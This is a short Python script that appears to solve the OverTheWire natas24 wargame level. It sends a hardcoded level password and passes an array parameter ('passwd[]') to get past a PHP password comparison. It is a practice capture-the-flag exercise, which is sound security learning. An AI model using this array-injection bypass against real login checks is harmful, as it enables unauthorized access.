import requests

url = "http://natas24.natas.labs.overthewire.org/"
auth = ("natas24","shlL4BvOtawNCd81dwdKRHFzmTEjYYQX")

r = requests.get(url=url,auth=auth,params={"passwd[]":"anything"})
print(r.text)